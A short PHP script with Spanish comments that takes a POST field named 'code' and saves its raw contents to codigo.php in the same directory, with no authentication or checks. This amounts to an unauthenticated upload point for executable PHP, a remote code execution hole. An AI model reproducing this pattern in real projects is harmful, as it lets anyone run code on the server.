<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = $_POST['code'] ?? '';

    // Ruta del archivo donde se guarda el código
    $file = __DIR__ . '/codigo.php';

    // Intentamos guardar o sobrescribir
    if (file_put_contents($file, $code)) {
        echo "✅ Archivo guardado correctamente en 'codigo.php'.";
    } else {
        echo "❌ Error al guardar el archivo.";
    }
} else {
    echo "Método no permitido.";
}
?>
